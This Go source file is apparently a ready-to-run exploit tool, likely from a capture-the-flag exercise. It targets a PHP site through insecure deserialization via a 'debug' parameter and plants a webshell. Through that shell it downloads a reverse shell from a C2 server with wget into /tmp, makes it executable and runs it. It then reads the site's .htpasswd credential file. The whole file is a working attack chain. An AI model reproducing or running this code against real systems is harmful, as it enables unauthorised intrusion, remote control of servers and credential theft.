package main

import (
	"flag"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"strings"
	"time"
)

const EnableVirtualTerminalProcessing uint32 = 0x4

var ANSI_SET bool = false

var ANSI_CLRLN string = "\r\x1b[2K\r"
var ANSI_CLRSC string = "\x1b[2J\x1b[H"
var ANSI_RST string = "\x1b[0m"
var ANSI_RED string = "\x1b[31;1m"
var ANSI_GRN string = "\x1b[32;1m"
var ANSI_YLW string = "\x1b[33;1m"
var ANSI_BLU string = "\x1b[34;1m"

type Client struct {
	baseURL string
	Route   string
	Session *http.Client
}

// ============================================================
//
// Function Name: UploadReverseShell
//
// Author: Thomas Osgood
//
// Description:
//
//  Function designed to execute a command on the target via
//  the uploaded webshell.
//
// Input(s):
//
//  command - string. command to execute on the target.
//
// Return(s):
//
//  output - []byte. byte representation of command output.
//  success - bool. indication of success.
//  message - string. status message.
//
// ============================================================
func (c *Client) ExecuteCommand(command string) (output []byte, success bool, message string) {
	var err error
	var params url.Values = url.Values{}
	var paramstr string
	var resp *http.Response
	var targeturl string = fmt.Sprintf("%s/%s", c.baseURL, c.Route)
	var txtcontent string

	params.Set("c", command)
	paramstr = params.Encode()

	targeturl = fmt.Sprintf("%s?%s", targeturl, paramstr)

	resp, err = c.Session.Get(targeturl)
	if err != nil {
		if os.IsTimeout(err) {
			return []byte("timeout encountered"), true, "timeout encountered. assuming long running command or reverse shell."
		}
		return nil, false, err.Error()
	}
	defer resp.Body.Close()

	if resp.StatusCode >= 400 {
		return nil, false, fmt.Sprintf("Bad Status Code (%s)", resp.Status)
	}

	output, err = ioutil.ReadAll(resp.Body)
	if err != nil {
		return nil, false, err.Error()
	}

	txtcontent, success, message = FindMatch(output, "<output>((.|\n)*)</output>")
	if !success {
		return output, true, message
	}

	txtcontent = strings.Replace(strings.Replace(txtcontent, "<output>", "", -1), "</output>", "", -1)
	txtcontent = strings.TrimSpace(txtcontent)
	output = []byte(txtcontent)

	return output, true, "command successfully executed"
}

// ============================================================
//
// Function Name: ExecuteReverseShell
//
// Author: Thomas Osgood
//
// Description:
//
//  Function designed to execute the reverse shell binary on
//  the target.
//
// Input(s):
//
//  None
//
// Return(s):
//
//  success - bool. indication of success.
//  message - string. status message.
//
// ============================================================
func (c *Client) ExecuteReverseShell() (success bool, message string) {
	var command string

	SysMsgNB("making target file executable ...")

	command = "chmod +x /tmp/junklog"
	_, success, message = c.ExecuteCommand(command)
	if !success {
		return false, message
	}

	SysMsgNB("firing off reverse shell ...")

	command = "/tmp/junklog"
	_, success, message = c.ExecuteCommand(command)
	if !success {
		return false, message
	}

	return true, "reverse shell successfully triggered"
}

// ============================================================
//
// Function Name: GetBodyContent
//
// Author: Thomas Osgood
//
// Description:
//
//  Function designed to take make a GET request to a target
//  route and return the body content to the user.
//
// Input(s):
//
//  route - string. route to make GET request on.
//
// Return(s):
//
//  bodycontent - []byte. content pulled from target URL.
//  success - bool. indication of success.
//  message - string. status message.
//
// ============================================================
func (c *Client) GetBodyContent(route string) (bodycontent []byte, err error) {
	var targetURL string = fmt.Sprintf("%s/%s", c.baseURL, route)

	resp, err := c.Session.Get(targetURL)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	bodycontent, err = ioutil.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}

	return bodycontent, nil
}

// ============================================================
//
// Function Name: Testconnection
//
// Author: Thomas Osgood
//
// Description:
//
//  Function designed to test the connection to a target.
//
// Input(s):
//
//  None.
//
// Return(s):
//
//  success - bool. indication of success.
//  message - string. status message.
//
// ============================================================
func (c *Client) TestConnection() (success bool, message string) {
	SysMsgNB(fmt.Sprintf("testing connection to \"%s\"", c.baseURL))

	resp, err := c.Session.Get(c.baseURL)
	if err != nil {
		return false, err.Error()
	}
	defer resp.Body.Close()

	return true, "client connection successful"
}

// ============================================================
//
// Function Name: UploadBackdoor
//
// Author: Thomas Osgood
//
// Description:
//
//  Function designed to upload a backdoor to the website via
//  insecure php deserialization.
//
// Input(s):
//
//  backdoor - string. serialized backdoor to upload.
//
// Return(s):
//
//  success - bool. indication of success.
//  message - string. status message.
//
// ============================================================
func (c *Client) UploadBackdoor(backdoor string) (success bool, message string) {
	var err error
	const route string = "index.php"
	var resp *http.Response
	var targeturl string

	targeturl = fmt.Sprintf("%s/%s?debug=%s", c.baseURL, route, backdoor)

	SysMsgNB("uploading backdoor ...")

	resp, err = c.Session.Get(targeturl)
	if err != nil {
		return false, err.Error()
	}
	defer resp.Body.Close()

	if resp.StatusCode >= 400 {
		return false, fmt.Sprintf("Bad Status Code (%s)", resp.Status)
	}

	return true, "backdoor successfully uploaded"
}

// ============================================================
//
// Function Name: UploadReverseShell
//
// Author: Thomas Osgood
//
// Description:
//
//  Function designed to upload a backdoor to the website via
//  insecure php deserialization.
//
// Input(s):
//
//  revshell - string. reverse shell file to upload to target.
//  c2addr - string. address of C2 server (ip:port)
//
// Return(s):
//
//  success - bool. indication of success.
//  message - string. status message.
//
// ============================================================
func (c *Client) UploadReverseShell(revshell string, c2addr string) (success bool, message string) {
	var command string = fmt.Sprintf("wget -O /tmp/junklog http://%s/%s", c2addr, revshell)

	SysMsgNB("uploading reverse shell ...")

	_, success, message = c.ExecuteCommand(command)
	if !success {
		return false, message
	}

	return true, "reverse shell successfully uploaded"
}

func SucMsg(msg string) {
	fmt.Printf("%s[%s+%s] %s\n", ANSI_CLRLN, ANSI_GRN, ANSI_RST, msg)
	return
}

func ErrMsg(msg string) {
	fmt.Printf("%s[%s-%s] %s\n", ANSI_CLRLN, ANSI_RED, ANSI_RST, msg)
	return
}

func InfMsg(msg string) {
	fmt.Printf("%s[%si%s] %s\n", ANSI_CLRLN, ANSI_BLU, ANSI_RST, msg)
	return
}

func InfMsgNB(msg string) {
	fmt.Printf("%s[%si%s] %s", ANSI_CLRLN, ANSI_BLU, ANSI_RST, msg)
	return
}

func SysMsg(msg string) {
	fmt.Printf("%s[%s*%s] %s\n", ANSI_CLRLN, ANSI_YLW, ANSI_RST, msg)
	return
}

func SysMsgNB(msg string) {
	fmt.Printf("%s[%s*%s] %s", ANSI_CLRLN, ANSI_YLW, ANSI_RST, msg)
	return
}

func ValidatePort(portno int) (success bool, message string) {
	if (portno < 1) || (portno > 65535) {
		return false, "port must be between 1 and 65535"
	}
	return true, "port valid"
}

//============================================================
//
// Function Name: PrintCenter
//
// Author: Thomas Osgood
//
// Description:
//
//  Function designed to print a message in the center of a
//  specified number of columns (n).
//
// Input(s):
//
//  msg - string. message to display.
//  n - int. total number of columns in row.
//
// Return(s):
//
//  None
//
//============================================================
func PrintCenter(msg string, n int) {
	var ansi_indent string = "\x1b%s"
	var indent_format string = "[%dC"
	var indent int

	fmt.Printf("%s", ANSI_CLRLN)
	if len(msg) > n {
		fmt.Printf("%s\n", msg)
		return
	}

	indent = (n - len(msg)) / 2
	indent_format = fmt.Sprintf(indent_format, indent)
	ansi_indent = fmt.Sprintf(ansi_indent, indent_format)

	fmt.Printf("%s%s%s%s\n", ansi_indent, ANSI_YLW, msg, ANSI_RST)

	return
}

func PrintChar(char byte, n int) {
	if n < 1 {
		return
	}

	for i := 0; i < n; i++ {
		fmt.Printf("%s%s%s", ANSI_RED, string(char), ANSI_RST)
	}
	fmt.Printf("\n")
}

//============================================================
//
// Function Name: FindMatch
//
// Author: Thomas Osgood
//
// Description:
//
//  Function designed to take a byte slice, search the slice
//  for a given regular expression pattern, and return the
//  first match of that pattern.
//
// Input(s):
//
//  bodycontent - []byte. byte slice to search for pattern.
//  tgtpattern - string. regex pattern to search for.
//
// Return(s):
//
//  match - string. first match of pattern discovered.
//  success - bool. indication of success.
//  message - string. status message.
//
//============================================================
func FindMatch(bodycontent []byte, tgtpattern string) (match string, success bool, message string) {

	re, err := regexp.Compile(tgtpattern)
	if err != nil {
		return "", false, err.Error()
	}

	matches := re.FindAll(bodycontent, -1)

	if len(matches) < 1 {
		return "", false, "no match found"
	}

	match = string(matches[0])

	return match, true, "match found"
}

// ============================================================
//
// Function Name: GenRandomName
//
// Author: Thomas Osgood
//
// Description:
//
//  Function designed to generate a random string 8 characters
//  long, containing only alpha-numeric characters.
//
// Input(s):
//
//  None.
//
// Return(s):
//
//  success - bool. indication of success.
//  message - string. status message.
//
// ============================================================
func GenRandomName() (name string, success bool, message string) {
	const charset string = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	const length int = 8

	name = ""

	for i := 0; i < length; i++ {
		name = fmt.Sprintf("%s%s", name, string(charset[rand.Intn(len(charset))]))
	}

	return name, true, "name successfully generated"
}

func init() {
	return
}

func main() {
	var domain string
	var port int

	var baseURL string
	var scheme string
	var route string

	var secure bool

	var attack string
	var c2addr string
	var revshell string

	var output []byte

	var client Client = Client{Session: &http.Client{Timeout: 10 * time.Second}}

	flag.StringVar(&attack, "a", "", "serialized string used to attack server")
	flag.StringVar(&c2addr, "c", "127.0.0.1", "address (ip:port) of c2 server")
	flag.StringVar(&domain, "d", "127.0.0.1", "domain or ip address of target")
	flag.IntVar(&port, "p", 80, "port to communicate with target on")
	flag.StringVar(&route, "r", "shell.php", "name of webshell being upload through serialization attack")
	flag.StringVar(&revshell, "R", "revshell", "reverse shell to upload to target")
	flag.BoolVar(&secure, "s", false, "use HTTPS instead of HTTP")
	flag.Parse()

	success, message := ValidatePort(port)
	if !success {
		ErrMsg(message)
		os.Exit(1)
	}

	PrintChar('=', 60)
	PrintCenter("Target Information", 60)
	PrintChar('=', 60)
	InfMsg(fmt.Sprintf("Target Domain: %s", domain))
	InfMsg(fmt.Sprintf("Target Port: %d", port))
	InfMsg(fmt.Sprintf("HTTPS: %v", secure))
	PrintChar('=', 60)

	//============================================================
	// HTTPS check.
	//============================================================
	if secure {
		scheme = "https"
	} else {
		scheme = "http"
	}
	baseURL = fmt.Sprintf("%s://%s:%d", scheme, domain, port)

	attack = strings.TrimSpace(attack)
	if len(attack) < 1 {
		ErrMsg("must provide a serialized attack string (-a)")
		os.Exit(1)
	}

	client.baseURL = baseURL
	client.Route = route

	//============================================================
	// Make sure the target is reachable.
	//============================================================
	success, message = client.TestConnection()
	if !success {
		ErrMsg(message)
		os.Exit(1)
	}
	SucMsg(message)

	success, message = client.UploadBackdoor(attack)
	if !success {
		ErrMsg(message)
		os.Exit(1)
	}
	SucMsg(message)

	success, message = client.UploadReverseShell(revshell, c2addr)
	if !success {
		ErrMsg(message)
		os.Exit(1)
	}
	SucMsg(message)

	success, message = client.ExecuteReverseShell()
	if !success {
		ErrMsg(message)
		os.Exit(1)
	}
	SucMsg(message)

	output, success, message = client.ExecuteCommand("cat .htpasswd")
	if !success {
		ErrMsg(message)
		os.Exit(1)
	}
	SucMsg(string(output))

	return
}

